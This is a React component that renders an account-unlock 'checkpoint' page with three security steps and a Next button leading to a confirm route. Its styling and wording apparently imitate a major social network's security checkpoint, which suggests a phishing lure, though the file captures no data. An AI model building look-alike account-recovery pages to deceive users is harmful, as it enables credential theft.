import { useNavigate } from "react-router";
import PrimaryButton from "../Components/UI/PrimaryBtn";
import "./checkpoint.scss";

const Checkpoint = () => {
  const navigate = useNavigate();
  return (
    <div
      style={{
        height: "100vh",
        background: "#f0f2f5",
        display: "flex",
        alignItems: "center",
        justifyContent: "center",
      }}
    >
      <div
        style={{
          padding: "1rem",
          paddingTop: "1.75rem",
          borderRadius:
            "max(0px, min(8px, ((100vw - 4px) - 100%) * 9999)) / 8px",
          backgroundColor: "#fff",
          boxShadow: "0 1px 2px rgba(0, 0, 0, 0.2)",
          width: "100%",
          maxWidth: "600px",
          display: "flex",
          flexDirection: "column",
          alignItems: "center",
        }}
      >
        <img
          src="/checkpoint.png"
          style={{
            width: "160px",
            position: "top",
          }}
          alt=""
        />
        <h1
          id="checkpoint_title"
          style={{
            marginTop: "2rem",
            fontWeight: "600",
            fontSize: "1.5rem",
            maxWidth: "90%",
            textAlign: "center",
          }}
        >
          How to unlock your account with your current device
        </h1>

        <div
          style={{
            marginTop: "1.75rem",
          }}
        >
          <div
            style={{
              display: "flex",
              marginBottom: "1rem",
              position: "relative",
            }}
          >
            <div
              style={{
                position: "absolute",
                background: "#e4e6eb",
                width: 2,
                height: "calc(100% + 1rem + 1px)",
                top: 0,
                left: 8,
                zIndex: 1,
              }}
            ></div>
            <div>
              <div
                style={{
                  position: "relative",
                  width: 20,
                  height: 20,
                  marginRight: "1.2rem",
                }}
              >
                <div
                  style={{
                    inset: 0,
                    background: "#216fdb",
                    borderRadius: "50%",
                    position: "absolute",
                    zIndex: 2,
                  }}
                ></div>

                <div
                  style={{
                    inset: 0,
                    boxShadow: "0 0 0 10px #e7f3ff",
                    borderRadius: "50%",
                    position: "absolute",
                    zIndex: 1,
                    opacity: ".35",
                  }}
                ></div>
              </div>
            </div>
            <div>
              <h5
                style={{
                  fontWeight: 600,
                  fontSize: 17,
                }}
              >
                Complete security steps
              </h5>
              <h5
                style={{
                  color: "#050505",
                  fontSize: 15,
                  fontWeight: 400,
                  marginBottom: 0,
                }}
              >
                This helps us to confirm the account you’re trying to access
                belongs to you.
              </h5>
            </div>
          </div>

          <div
            style={{
              display: "flex",
              marginBottom: ".25rem",
              position: "relative",
            }}
          >
            <div
              style={{
                position: "absolute",
                background: "#e4e6eb",
                width: 2,
                height: "calc(100% + .25rem + 1px)",
                top: 0,
                left: 8,
                zIndex: 1,
              }}
            ></div>
            <div>
              <div
                style={{
                  width: 20,
                  height: 20,
                  background: "#e4e6eb",
                  borderRadius: "50%",
                  marginRight: "1.2rem",
                  position: "relative",
                  zIndex: 2,
                }}
              ></div>
            </div>
            <div>
              <h5
                style={{
                  fontWeight: 400,
                  fontSize: 17,
                  color: "#bcc0c4",
                }}
              >
                Secure your login details
              </h5>
            </div>
          </div>

          <div
            style={{
              display: "flex",
              marginBottom: "1rem",
              position: "relative",
            }}
          >
            <div>
              <div
                style={{
                  width: 20,
                  height: 20,
                  background: "#e4e6eb",
                  borderRadius: "50%",
                  marginRight: "1.2rem",
                  zIndex: 2,
                }}
              ></div>
            </div>
            <div>
              <h5
                style={{
                  fontWeight: 400,
                  fontSize: 17,
                  color: "#bcc0c4",
                }}
              >
                Your account will be unlocked
              </h5>
            </div>
          </div>
        </div>

        <div
          style={{
            width: "100%",
            display: "flex",
          }}
        >
          <PrimaryButton
            btnstyle={{
              height: 36,
              marginTop: "1.5rem",
              flex: 1,
              background: "#e4e6eb",
              color: "black",
              marginRight: ".75rem",
            }}
            onClick={() => navigate("/")}
            text={"Back"}
          />
          <PrimaryButton
            btnstyle={{
              height: 36,
              marginTop: "1.5rem",
              flex: 1,
            }}
            onClick={() => navigate("/confirm")}
            text={"Next"}
          />
        </div>
      </div>
    </div>
  );
};

export default Checkpoint;
